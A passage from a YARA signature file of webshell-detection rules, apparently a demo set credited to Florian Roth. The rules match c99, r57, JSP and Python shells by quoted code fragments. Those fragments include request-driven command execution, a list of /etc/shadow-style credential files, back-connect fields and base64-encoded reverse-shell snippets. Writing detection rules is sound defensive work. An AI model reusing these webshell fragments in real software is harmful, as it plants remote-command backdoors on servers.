      $s2 = "U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAAMUExURf///wAAAJmZzAAAACJoURkAAAAE" 
      $s3 = "return \"<BR>Dump error! Can't write to \".htmlspecialchars($file);" 
   condition: 
      1 of them
}

rule Webshell_pws_php_php_RID2F4E : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file pws.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:51:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<div align=\"left\"><font size=\"1\">Input command :</font></div>" fullword
      $s1 = "<input type=\"text\" name=\"cmd\" size=\"30\" class=\"input\"><br>" fullword
      $s4 = "<input type=\"text\" name=\"dir\" size=\"30\" value=\"<? passthru(\"pwd\"); ?>" 
   condition: 
      2 of them
}

rule Webshell_PHP_Shell_php_php_RID3133 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file PHP Shell.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:12:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "echo \"</form><form action=\\\"$SFileName?$urlAdd\\\" method=\\\"post\\\"><input" 
      $s1 = "echo \"<form action=\\\"$SFileName?$urlAdd\\\" method=\\\"POST\\\"><input type=" 
   condition: 
      all of them
}

rule Webshell_Ayyildiz_Tim___AYT__Shell_v_2_1_Biz_html_RID39CD : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file Ayyildiz Tim  -AYT- Shell v 2.1 Biz.html.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 19:19:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Ayyildiz" 
      $s1 = "TouCh By iJOo" 
      $s2 = "First we check if there has been asked for a working directory" 
      $s3 = "http://ayyildiz.org/images/whosonline2.gif" 
   condition: 
      2 of them
}

rule Webshell_Ajax_PHP_Command_Shell_php_RID348D : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file Ajax_PHP Command Shell.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 15:35:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "newhtml = '<b>File browser is under construction! Use at your own risk!</b> <br>" 
      $s2 = "Empty Command..type \\\"shellhelp\\\" for some ehh...help" 
      $s3 = "newhtml = '<font size=0><b>This will reload the page... :(</b><br><br><form enct" 
   condition: 
      1 of them
}

rule Webshell_JspWebshell_1_2_jsp_RID31D6 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file JspWebshell 1.2.jsp.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:39:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "JspWebshell" 
      $s1 = "CreateAndDeleteFolder is error:" 
      $s2 = "<td width=\"70%\" height=\"22\">&nbsp;<%=env.queryHashtable(\"java.c" 
      $s3 = "String _password =\"111\";" 
   condition: 
      2 of them
}

rule Webshell_Phyton_Shell_py_RID30C7 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file Phyton Shell.py.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:54:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "sh_out=os.popen(SHELL+\" \"+cmd).readlines()" fullword
      $s2 = "#   d00r.py 0.3a (reverse|bind)-shell in python by fQ" fullword
      $s3 = "print \"error; help: head -n 16 d00r.py\"" fullword
      $s4 = "print \"PW:\",PW,\"PORT:\",PORT,\"HOST:\",HOST" fullword
   condition: 
      1 of them
}

rule Webshell_mysql_tool_php_php_RID3247 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file mysql_tool.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:58:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "$error_text = '<strong>Failed selecting database \"'.$this->db['" 
      $s1 = "$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERV" 
      $s4 = "<div align=\"center\">The backup process has now started<br " 
   condition: 
      1 of them
}

rule Webshell_sh_php_php_RID2ECF : DEMO SCRIPT T1087_001 T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file sh.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:30:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1087_001, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$ar_file=array('/etc/passwd','/etc/shadow','/etc/master.passwd','/etc/fstab','/e" 
      $s2 = "Show <input type=text size=5 value=\".((isset($_POST['br_st']))?$_POST['br_st']:" 
   condition: 
      1 of them
}

rule Webshell_phpbackdoor15_php_RID3140 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file phpbackdoor15.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:14:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "echo \"fichier telecharge dans \".good_link(\"./\".$_FILES[\"fic\"][\"na" 
      $s2 = "if(move_uploaded_file($_FILES[\"fic\"][\"tmp_name\"],good_link(\"./\".$_FI" 
      $s3 = "echo \"Cliquez sur un nom de fichier pour lancer son telechargement. Cliquez s" 
   condition: 
      1 of them
}

rule Webshell_cgi_python_py_RID3022 : DEMO SCRIPT T1059_006 T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file cgi-python.py.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:26:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1059_006, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "a CGI by Fuzzyman" 
      $s1 = "\"\"\"+fontline +\"Version : \" + versionstring + \"\"\", Running on : \"\"\" + " 
      $s2 = "values = map(lambda x: x.value, theform[field])     # allows for" 
   condition: 
      1 of them
}

rule Webshell_ru24_post_sh_php_php_RID32A0 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file ru24_post_sh.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 14:13:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<title>Ru24PostWebShell - \".$_POST['cmd'].\"</title>" fullword
      $s3 = "if ((!$_POST['cmd']) || ($_POST['cmd']==\"\")) { $_POST['cmd']=\"id;pwd;uname -a" 
      $s4 = "Writed by DreAmeRz" fullword
   condition: 
      1 of them
}

rule Webshell_DTool_Pro_php_RID2FBF : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file DTool Pro.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:10:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "r3v3ng4ns\\nDigite" 
      $s1 = "if(!@opendir($chdir)) $ch_msg=\"dtool: line 1: chdir: It seems that the permissi" 
      $s3 = "if (empty($cmd) and $ch_msg==\"\") echo (\"Comandos Exclusivos do DTool Pro\\n" 
   condition: 
      1 of them
}

rule Webshell_php_include_w_shell_php_RID3425 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file php-include-w-shell.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 15:18:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "$dataout .= \"<td><a href='$MyLoc?$SREQ&incdbhost=$myhost&incdbuser=$myuser&incd" 
      $s1 = "if($run == 1 && $phpshellapp && $phpshellhost && $phpshellport) $strOutput .= DB" 
   condition: 
      1 of them
}

rule Webshell_shell_php_php_RID300C : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file shell.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:23:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "/* We have found the parent dir. We must be carefull if the parent " fullword
      $s2 = "$tmpfile = tempnam('/tmp', 'phpshell');" 
      $s3 = "if (ereg('^[[:blank:]]*cd[[:blank:]]+([^;]+)$', $command, $regs)) {" fullword
   condition: 
      1 of them
}

rule Webshell_cmdjsp_jsp_RID2ED3 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file cmdjsp.jsp.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:31:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "// note that linux = cmd and windows = \"cmd.exe /c + cmd\" " fullword
      $s1 = "Process p = Runtime.getRuntime().exec(\"cmd.exe /C \" + cmd);" fullword
      $s2 = "cmdjsp.jsp" 
      $s3 = "michaeldaw.org" fullword
   condition: 
      2 of them
}

rule Webshell_MySQL_Web_Interface_Version_0_8_php_RID37DB : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file MySQL Web Interface Version 0.8.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 17:56:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "SooMin Kim" 
      $s1 = "http://popeye.snu.ac.kr/~smkim/mysql" 
      $s2 = "href='$PHP_SELF?action=dropField&dbname=$dbname&tablename=$tablename" 
      $s3 = "<th>Type</th><th>&nbspM&nbsp</th><th>&nbspD&nbsp</th><th>unsigned</th><th>zerofi" 
   condition: 
      2 of them
}

rule Webshell_simple_cmd_html_RID30D7 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - file simple_cmd.html.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:57:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<title>G-Security Webshell</title>" fullword
      $s2 = "<input type=TEXT name=\"-cmd\" size=64 value=\"<?=$cmd?>\" " fullword
      $s3 = "<? if($cmd != \"\") print Shell_Exec($cmd);?>" fullword
      $s4 = "<? $cmd = $_REQUEST[\"-cmd\"];?>" fullword
   condition: 
      all of them
}

rule Webshell__1_c2007_php_php_c100_php_RID3309 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files 1.txt, c2007.php.php.txt, c100.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 14:30:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "d089e7168373a0634e1ac18c0ee00085"
      hash2 = "38fd7e45f9c11a37463c3ded1c76af4c"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "echo \"<b>Changing file-mode (\".$d.$f.\"), \".view_perms_color($d.$f).\" (\"" 
      $s3 = "echo \"<td>&nbsp;<a href=\\\"\".$sql_surl.\"sql_act=query&sql_query=\".ur" 
   condition: 
      1 of them
}

rule Webshell_nst_perl_proxy_shell_RID3325 : DEMO SCRIPT T1090 T1105 T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files nst.php.php.txt, img.php.php.txt, nstview.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 14:35:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "17a07bb84e137b8aa60f87cd6bfab748"
      hash2 = "4745d510fed4378e4b1730f56f25e569"
      tags = "DEMO, SCRIPT, T1090, T1105, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<tr><form method=post><td><font color=red><b>Back connect:</b></font></td><td><i" 
      $s1 = "$perl_proxy_scp = \"IyEvdXNyL2Jpbi9wZXJsICANCiMhL3Vzci91c2MvcGVybC81LjAwNC9iaW4v" 
      $s2 = "<tr><form method=post><td><font color=red><b>Backdoor:</b></font></td><td><input" 
   condition: 
      1 of them
}

rule Webshell_network_php_xinfo_RID31DA : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files network.php.php.txt, xinfo.php.php.txt, nfm.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:40:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "2601b6fc1579f263d2f3960ce775df70"
      hash2 = "401fbae5f10283051c39e640b77e4c26"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = ".textbox { background: White; border: 1px #000000 solid; color: #000099; font-fa" 
      $s2 = "<input class='inputbox' type='text' name='pass_de' size=50 onclick=this.value=''" 
   condition: 
      all of them
}

rule Webshell_SpecialShell_99_php_php_RID337E : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt, SpecialShell_99.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 14:50:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "3ca5886cd54d495dc95793579611f59a"
      hash2 = "9c5bb5e3a46ec28039e8986324e42792"
      hash3 = "09609851caa129e40b0d56e90dfc476c"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "echo \"<hr size=\\\"1\\\" noshade><b>Done!</b><br>Total time (secs.): \".$ft" 
      $s3 = "$fqb_log .= \"\\r\\n------------------------------------------\\r\\nDone!\\r" 
   condition: 
      1 of them
}

rule Webshell_r577_php_php_SnIpEr_2_RID322A : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files r577.php.php.txt, SnIpEr_SA Shell.php.txt, r57.php.php.txt, r57 Shell.php.php.txt, spy.php.php.txt, s.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:53:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "911195a9b7c010f61b66439d9048f400"
      hash2 = "eddf7a8fde1e50a7f2a817ef7cece24f"
      hash3 = "8023394542cddf8aee5dec6072ed02b5"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "'eng_text71'=>\"Second commands param is:\\r\\n- for CHOWN - name of new owner o" 
      $s4 = "if(!empty($_POST['s_mask']) && !empty($_POST['m'])) { $sr = new SearchResult" 
   condition: 
      1 of them
}

rule Webshell_c99shell_v1_0_RID2F28 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files c99shell_v1.0.php.php.txt, c99php.txt, SsEs.php.php.txt, ctt_sh.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:45:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "9e9ae0332ada9c3797d6cee92c2ede62"
      hash2 = "6cd50a14ea0da0df6a246a60c8f6f9c9"
      hash3 = "671cad517edd254352fe7e0c7c981c39"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "\"AAAAACH5BAEAAAkALAAAAAAUABQAAAR0MMlJqyzFalqEQJuGEQSCnWg6FogpkHAMF4HAJsWh7/ze\"" 
      $s2 = "\"mTP/zDP//2YAAGYAM2YAZmYAmWYAzGYA/2YzAGYzM2YzZmYzmWYzzGYz/2ZmAGZmM2ZmZmZmmWZm\"" 
      $s4 = "\"R0lGODlhFAAUAKL/AP/4/8DAwH9/AP/4AL+/vwAAAAAAAAAAACH5BAEAAAEALAAAAAAUABQAQAMo\"" 
   condition: 
      2 of them
}

rule Webshell_r577_php_spy_RID2F1D : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files r577.php.php.txt, spy.php.php.txt, s.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:43:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "eed14de3907c9aa2550d95550d1a2d5f"
      hash2 = "817671e1bdc85e04cc3440bbd9288800"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "echo $te.\"<div align=center><textarea cols=35 name=db_query>\".(!empty($_POST['" 
      $s3 = "echo sr(45,\"<b>\".$lang[$language.'_text80'].$arrow.\"</b>\",\"<select name=db>" 
   condition: 
      1 of them
}

rule Webshell_c99_generic_RID2EB7 : DEMO GEN T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated "
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:26:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "3ca5886cd54d495dc95793579611f59a"
      hash2 = "9c5bb5e3a46ec28039e8986324e42792"
      hash3 = "d8ae5819a0a2349ec552cbcf3a62c975"
      tags = "DEMO, GEN, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "  if ($copy_unset) {foreach($sess_data[\"copy\"] as $k=>$v) {unset($sess_data[\"" 
      $s1 = "  if (file_exists($mkfile)) {echo \"<b>Make File \\\"\".htmlspecialchars($mkfile" 
      $s2 = "  echo \"<center><b>MySQL \".mysql_get_server_info().\" (proto v.\".mysql_get_pr" 
      $s3 = "  elseif (!fopen($mkfile,\"w\")) {echo \"<b>Make File \\\"\".htmlspecialchars($m" 
   condition: 
      all of them
}

rule Webshell_SpecialShell_99a_RID3091 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated "
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:45:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "3ca5886cd54d495dc95793579611f59a"
      hash2 = "9c5bb5e3a46ec28039e8986324e42792"
      hash3 = "d8ae5819a0a2349ec552cbcf3a62c975"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "$sess_data[\"cut\"] = array(); c99_s" 
      $s3 = "if ((!eregi(\"http://\",$uploadurl)) and (!eregi(\"https://\",$uploadurl))" 
   condition: 
      1 of them
}

rule Webshell_SpecialShell_99b_RID3092 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files w.php.php.txt, wacking.php.php.txt, SpecialShell_99.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:45:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "9c5bb5e3a46ec28039e8986324e42792"
      hash2 = "09609851caa129e40b0d56e90dfc476c"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "\"<td>&nbsp;<a href=\\\"\".$sql_surl.\"sql_act=query&sql_query=\".ur" 
      $s2 = "c99sh_sqlquery" 
   condition: 
      1 of them
}

rule Webshell_SpecialShell_99c_RID3093 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt, SsEs.php.php.txt, SpecialShell_99.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 12:45:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "3ca5886cd54d495dc95793579611f59a"
      hash2 = "9c5bb5e3a46ec28039e8986324e42792"
      hash3 = "6cd50a14ea0da0df6a246a60c8f6f9c9"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "else {$act = \"f\"; $d = dirname($mkfile); if (substr($d,-1) != DIRECTORY_SEPA" 
      $s3 = "else {echo \"<b>File \\\"\".$sql_getfile.\"\\\":</b><br>\".nl2br(htmlspec" 
   condition: 
      1 of them
}

rule WEBSHEL_PHP_Generic_Mar14_RID2F62 : DEMO GEN T1505_003 WEBSHELL {
   meta:
      description = "Detects PHP webshell"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 11:54:51"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2023-05-12"
      hash1 = "f51a5c5775d9cca0b137ddb28ff3831f4f394b7af6f6a868797b0df3dcdb01ba"
      hash2 = "ef74644065925aa8d64913f5f124fe73d8d289d5f019a104bf5f56689f49ba92"
      hash3 = "9ecdb14b41785c779d9721e11bf9e1b7e35611015f4aabf9a1f54a82eaa0725c"
      tags = "DEMO, GEN, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "echo sr(15,\"<b>\".$lang[$language.'_text" 
      $s1 = ".$arrow.\"</b>\",in('text','" 
   condition: 
      2 of them
}

rule Webshell_r577_php_php_SnIpEr_RID3199 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files r577.php.php.txt, SnIpEr_SA Shell.php.txt, r57.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 13:29:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "911195a9b7c010f61b66439d9048f400"
      hash2 = "eddf7a8fde1e50a7f2a817ef7cece24f"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "'ru_text9' =>'???????? ????? ? ???????? ??? ? /bin/bash'," fullword
      $s1 = "$name='ec371748dc2da624b35a4f8f685dd122'" 
      $s2 = "rst.void.ru" 
   condition: 
      3 of them
}

rule Webshell_Spy_r57_RID2D1F : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files r577.php.php.txt, r57 Shell.php.php.txt, spy.php.php.txt, s.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 10:18:21"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "8023394542cddf8aee5dec6072ed02b5"
      hash2 = "eed14de3907c9aa2550d95550d1a2d5f"
      hash3 = "817671e1bdc85e04cc3440bbd9288800"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "echo ws(2).$lb.\" <a" 
      $s1 = "$sql = \"LOAD DATA INFILE \\\"\".$_POST['test3_file']" 
      $s3 = "if (empty($_POST['cmd'])&&!$safe_mode) { $_POST['cmd']=($windows)?(\"dir\"):(\"l" 
   condition: 
      2 of them
}

rule Webshell_SpecialShell_99_php_php_c100_php_RID3678 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files wacking.php.php.txt, 1.txt, SpecialShell_99.php.php.txt, c100.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 16:57:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "44542e5c3e9790815c49d5f9beffbbf2"
      hash2 = "09609851caa129e40b0d56e90dfc476c"
      hash3 = "38fd7e45f9c11a37463c3ded1c76af4c"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "if(eregi(\"./shbd $por\",$scan))" 
      $s1 = "$_POST['backconnectip']" 
      $s2 = "$_POST['backcconnmsg']" 
   condition: 
      1 of them
}

rule Webshell_r577_php_RID2D62 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files r577.php.php.txt, r57.php.php.txt, r57 Shell.php.php.txt, spy.php.php.txt, s.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 10:29:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "eddf7a8fde1e50a7f2a817ef7cece24f"
      hash2 = "8023394542cddf8aee5dec6072ed02b5"
      hash3 = "eed14de3907c9aa2550d95550d1a2d5f"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "if(rmdir($_POST['mk_name']))" 
      $s2 = "$r .= '<tr><td>'.ws(3).'<font face=Verdana size=-2><b>'.$key.'</b></font></td>" 
      $s3 = "if(unlink($_POST['mk_name'])) echo \"<table width=100% cellpadding=0 cell" 
   condition: 
      2 of them
}

rule Webshell_SpecialShell_99_php_c_RID3299 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files w.php.php.txt, wacking.php.php.txt, SsEs.php.php.txt, SpecialShell_99.php.php.txt"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 14:12:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "9c5bb5e3a46ec28039e8986324e42792"
      hash2 = "6cd50a14ea0da0df6a246a60c8f6f9c9"
      hash3 = "09609851caa129e40b0d56e90dfc476c"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "\"ext_avi\"=>array(\"ext_avi\",\"ext_mov\",\"ext_mvi" 
      $s1 = "echo \"<b>Execute file:</b><form action=\\\"\".$surl.\"\\\" method=POST><inpu" 
      $s2 = "\"ext_htaccess\"=>array(\"ext_htaccess\",\"ext_htpasswd" 
   condition: 
      1 of them
}

rule Webshell_multiple_php_webshells_RID33E1 : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files multiple_php_webshells"
      author = "Florian Roth"
      reference = "-"
      date = "2014-03-29 15:06:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "911195a9b7c010f61b66439d9048f400"
      hash2 = "be0f67f3e995517d18859ed57b4b4389"
      hash3 = "eddf7a8fde1e50a7f2a817ef7cece24f"
      tags = "DEMO, T1505_003, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuI" 
      $s2 = "sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0" 
      $s4 = "A8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxlcnJuby5oPg" 
   condition: 
      2 of them
}

rule Webshell_c99madshell_v2_RID2FCC : DEMO T1505_003 WEBSHELL {
   meta:
      description = "Semi-Auto-generated - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt"
      author = "Florian Roth"
      reference = "-"
